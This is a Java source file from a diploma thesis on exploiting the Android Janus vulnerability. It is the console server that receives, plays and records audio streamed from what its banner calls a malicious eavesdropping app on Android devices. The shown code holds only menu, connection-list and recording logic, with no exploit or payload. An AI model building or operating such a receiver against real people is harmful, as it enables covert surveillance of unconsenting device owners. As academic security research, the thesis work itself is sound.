// Tento kod je soucast diplomove prace Vyuziti zranitelnosti Janus na operacnim systemu Android
// Autor: Bc. Vit Soucek
//
// Pouzite zdroje:
//    - zminene primo v kodu v dokumentacnich komentarich

package com.company;

import java.io.IOException;
import java.util.Scanner;

class Server {
    private static ServerThread thread;
    static int maxMemorySize = 100;
    static int maxConnectionCount = 10;

    /**
     * Starting point of the program.
     * <p>
     * Initialize the server thread, show help
     * and then scan for and interpret users input.
     *
     * @param args One argument -- maximum allowed memory size for pre-recording the audio
     * @throws IOException in case something went wrong with file output streams
     */
    public static void main(String[] args) throws IOException {

        parseArguments(args);
        System.out.println("[-] Max memory to use per connection: " + maxMemorySize + " MB");
        System.out.println("[-] Max number of connections: " + maxConnectionCount);

        thread = new ServerThread(maxMemorySize, maxConnectionCount);
        thread.start();

        showWelcomeScreen();

        Scanner input = new Scanner(System.in);

        boolean status = true;

        while (status) {
            String connectionID = "";
            System.out.print("> ");
            String option = input.next();
            switch (option) {
                case "l":
                    listConnections();
                    break;
                case "s":
                    connectionID = input.next();
                    switchToConnection(connectionID);
                    break;
                case "d":
                    connectionID = input.next();
                    removeConnection(connectionID);
                    break;
                case "q":
                    status = false;
                    thread.status = false;
                    break;
                case "r":
                    connectionID = input.next();
                    startRecording(connectionID);
                    break;
                case "c":
                    connectionID = input.next();
                    stopRecording(connectionID);
                    break;
                case "h":
                    showHelp();
                    break;
                default:
                    System.out.println("Unknown command: " + option);
            }
        }
        System.out.println("Exiting the application");
        System.exit(0);
    }

    /**
     * Parse the argument passed on the command line.
     * @param args Array of argument Strings
     */
    private static void parseArguments(String[] args) {
        if (args.length == 0) {
            System.out.println("[-] Using default parameter values");
        } else if (args.length == 4) {
            for (int i = 0; i < args.length; i += 2) {
                switch (args[i]) {
                    case "-c":
                        int mc = Integer.parseInt(args[i + 1]);
                        if (mc < 1) {
                            System.out.println("Argument MAX_CONN must be >= 1!");
                            showUsage();
                            System.exit(0);
                        }
                        maxConnectionCount = mc;
                        break;
                    case "-m":
                        int mm = Integer.parseInt(args[i + 1]);
                        if (mm < 1) {
                            System.out.println("Argument MAX_MEM must be >= 1");
                            showUsage();
                            System.exit(0);
                        }
                        maxMemorySize = mm;
                        break;
                    case "-h":
                        showUsage();
                        System.exit(0);
                        break;
                    default:
                        System.out.println("Unknown argument");
                        showUsage();
                        System.exit(0);
                }
            }
        } else {
            System.out.println("Wrong number of arguments!");
            showUsage();
            System.exit(0);
        }
    }

    /**
     * Display a usage message
     */
    private static void showUsage() {
        System.out.println("Usage:");
        System.out.println("- default parameters: $ java com.company.Server");
        System.out.println("- custom parameters:  $ java com.company.Server -c <MAX_CONN> -m <MAX_MEM>");
        System.out.println("       MAX_CONN -- maximum number of connections that will be accepted (default: " + maxConnectionCount + ")");
        System.out.println("       MAX_MEM  -- max memory (in MB) allocated for pre-recording one connection (default: " + maxMemorySize + ")");
    }

    /**
     * Stop recording the connection passed in the argument.
     * <p>
     * If the connectionID equals to "a" or "active", replace
     * that with the active connection ID.
     *
     * @param connectionID ID of the connection to be stopped recording
     * @throws IOException in case something went wrong with the output file stream
     */
    private static void stopRecording(String connectionID) throws IOException {
        if (connectionID.equals("a") || connectionID.equals("active")) {
            if (thread.activeConnection.equals("")) {
                System.out.println("[-] No active connection, cannot stop recording it");
                return;
            }
            connectionID = thread.activeConnection;
        }

        if (!checkConnection(connectionID))
            return;

        Connection toStop = thread.connections.get(connectionID);
        if (toStop != null)
            toStop.stopRecording();
        else
            System.out.println("[-] Connection with this ID not found");
    }

    /**
     * Start recording a connection given in the argument.
     * If the connectionID equals to "a" or "active", replace
     * that with the active connection ID.
     *
     * @param connectionID Connection that should be recorded
     */
    private static void startRecording(String connectionID) {
        if (connectionID.equals("a") || connectionID.equals("active")) {
            if (thread.activeConnection.equals("")) {
                System.out.println("[-] No active connection to record");
                return;
            }
            connectionID = thread.activeConnection;
        }

        if (!checkConnection(connectionID))
            return;

        Connection toRecord = thread.connections.get(connectionID);
        if (toRecord != null)
            toRecord.startRecording();
        else
            System.out.println("[-] Connection with this ID not found");
    }

    /**
     * Remove the given connection from the thread's list.
     *
     * @param connectionID Connection to be removed
     */
    private static void removeConnection(String connectionID) {
        if (connectionID.equals("a") || connectionID.equals("active"))
            connectionID = thread.activeConnection;

        if (checkConnection(connectionID)) {
            thread.removeConnection(connectionID);
        }
    }

    /**
     * Check whether the given connection is in a valid format.
     * <p>
     * Connection should always be a string looking like this:
     * IP:port
     * <p>
     * Apart form the format, the validity of the IP address
     * and the port number is checked as well.
     * <p>
     * Inspired by the answer to the StackOverflow question "Validate IPv4 address in Java
     * author of the answer: Akarshit Wal
     * available at: https://stackoverflow.com/a/30691451/6136143
     *
     * @param connectionID Connection to be validated
     * @return True if the connection is valid, false otherwise
     */
    private static boolean checkConnection(String connectionID) {
        String[] split_conn = connectionID.split(":");

        if (split_conn.length != 2) {
            System.out.println("Connection in wrong format: " + connectionID + ". Should be: IP:port");
            return false;
        }

        String ip = split_conn[0];
        int port = Integer.parseInt(split_conn[1]);

        String pattern = "^((0|1\\d?\\d?|2[0-4]?\\d?|25[0-5]?|[3-9]\\d?)\\.){3}(0|1\\d?\\d?|2[0-4]?\\d?|25[0-5]?|[3-9]\\d?)$";
        if (!ip.matches(pattern)) {
            System.out.println("IP address is not valid: " + ip);
            return false;
        }

        if (port > 65535 || port < 0) {
            System.out.println("Invalid port number: " + port);
            return false;
        }
        return true;
    }

    /**
     * Switch the active connection of the thread to the one
     * given as an argument.
     * <p>
     * The connection is validated first.
     *
     * @param connectionID Connection to be marked as active
     */
    private static void switchToConnection(String connectionID) {
        if (checkConnection(connectionID)) {
            if (!thread.connections.containsKey(connectionID)) {
                System.out.println("[-] The connection does not exist");
                return;
            }
            System.out.println("[-] Connection " + connectionID + " set as active. Replaced " + thread.activeConnection);
            thread.activeConnection = connectionID;
        }
    }

    /**
     * Print the whole connection list of the thread,
     * so that the user can choose which one to make active or record.
     */
    private static void listConnections() {
        System.out.println("----------------------------------------");
        System.out.println("Active connection: " + thread.activeConnection);
        System.out.println("----------------------------------------");
        System.out.println("Other connections: ");
        for (String connectionID : thread.connections.keySet()) {
            if (!connectionID.equals(thread.activeConnection))
                System.out.println(" - " + connectionID);
        }
        if(thread.connections.size() >= maxConnectionCount){
            System.out.println("MAX CONNECTION LIMIT REACHED -- if you want any new connection, please remove some from the list.");
        }
    }

    /**
     * Show the usage message.
     */
    private static void showHelp() {
        System.out.println("");
        System.out.println("USAGE:");
        System.out.println("======");
        System.out.println("l: List all available connections");
        System.out.println("   This option lists all connection that are known to the server.");
        System.out.println("   The server automatically saves a connection to the list when it");
        System.out.println("     receives some data from the connection.");
        System.out.println("");
        System.out.println("s <CONNECTION>: Switch to chosen connection");
        System.out.println("                Make this connection active -- data from this connection");
        System.out.println("                  will be played on the speaker.");
        System.out.println("                Example: s 192.168.1.100:12345");
        System.out.println("");
        System.out.println("d <CONNECTION>: Delete selected connection");
        System.out.println("                Once you receive no data from a connection, you can manually");
        System.out.println("                  remove it from the list.");
        System.out.println("                Example: r 192.168.1.100:12345");
        System.out.println("");
        System.out.println("r <CONNECTION>: Start recording the connection");
        System.out.println("   The recording will be saved in current directory as <connection>___<timestamp>.wav");
        System.out.println("");
        System.out.println("c <CONNECTION>: Stop recording the active connection");
        System.out.println("");
        System.out.println("q: Quit this application.");
        System.out.println("");
        System.out.println("h: Show this help");
        System.out.println("");
        System.out.println("<CONNECTION> can be either a string in format IP:port or a letter 'a' for a connection that is active at the time (except for the 's' command)");
    }

    private static void showWelcomeScreen(){
        System.out.println("   ___                         _____                          \n" +
                "  |_  |                       /  ___|                         \n" +
                "    | | __ _ _ __  _   _ ___  \\ `--   ___ _ ____   _____ _ __ \n" +
                "    | |/ _` | '_ \\| | | / __|  `--  \\/ _ \\ '__\\ \\ / / _ \\ '__|\n" +
                "/\\__/ / (_| | | | | |_| \\__ \\ /\\__/ /  __/ |   \\ V /  __/ |   \n" +
                "\\____/ \\__,_|_| |_|\\__,_|___/ \\____/ \\___|_|    \\_/ \\___|_|  \n" +
                "\n" +
                "             MMMMMMMMMMMMMM      Server program created to receive\n" +
                "          IMMMMMMMMMMMMMMMMMM     data from the mallicious eavesdropping\n" +
                "         MMMMMMMMMMMMMMMMMMMMM     application installed on an Android device.\n" +
                "        MMMMMMMMMMMMMMMMMMMMMMM         \n" +
                "       ,MMMMMMMMMMMMMMMMMMMMMMMM   This program is a part of the diploma thesis\n" +
                "       MMMMMMMMMMMMMMMMMMMMMMMMM        \n" +
                "       MMMMMMMMMMMMMMMMMMMMMMMMM   -------------------------------\n" +
                "       MMMMMMMMMMMMMMMMMMMMMMMMM   \"Exploiting Janus vulnerability\n" +
                "        MMM~     DMMMMMM  +MMMMM          on Android OS\"   \n" +
                "        MMM       IMM       MMM    -------------------------------\n" +
                "         MMM      M=NM      DM,    Author: inserthackernamehere, 2020\n" +
                "          MMMMM MMM  MMM   MMM          \n" +
                "          MMMMMMMM    MMMMMMMM   If you want to change the limits on used memory\n" +
                "          MMMMMMMM, M,MMMMMMMM   and incoming connections, relaunch the program\n" +
                "             ,MMMMMMMMMMMMMMM    with arguments:\n" +
                "            ? MMMMMMMMMMM               \n" +
                "             +   MMMMM +         $ java <program> -c <MAX_CONN> -m <MAX_MEM>\n" +
                "             MD         MM              _______\n" +
                "             MMMMM,M MMMMM              |USAGE:|________________________________\n" +
                "              MMMMMMMMMMMM              | h        - show help\n" +
                "                MMMMMMMN        7MMM    | l        - list available connections\n" +
                "  MMMMMMMMM        :       MMMMMMMMMMM  | s <CONN> - listen to connection <CONN>\n" +
                " MMMMMMMMMMMMMMM      OMMMMMMMMMMM    M | d <CONN> - delete <CONN> from the list\n" +
                "MMMMM  MMMMMMMMMMM=MMMMMMMMMMMMM MMMMMM |            of connections\n" +
                "MMMMMMM MM     $MMMMMMM8     MM MMMMMM  | r <CONN> - Start recording <CONN>\n" +
                "  MMMMMM M   MMMMMMMDMMMMMM   MMMMMMM   | c <CONN> - Stop recording <CONN>,\n" +
                "    MMMMN MMMMMMM     MMMMMMMI          |            save to file\n" +
                "        MMMMMMM         ,MMMMMMM        | q        - quit application\n" +
                "      MMMMMMMMM         MMMMMMMMM8      | \n" +
                "      MMMM  MMMM         MMM  MMMM      | <CONN> can either be a connection\n" +
                "      MM NMMMMMM        MMMMMMIZMM      | identifier in format IP:port or\n" +
                "      MMMMMMMMM          MMMMMM~M       | a letter 'a' for connection that\n" +
                "       MMMMMM              MMMMM        | is active at the time.\n");
    }
}

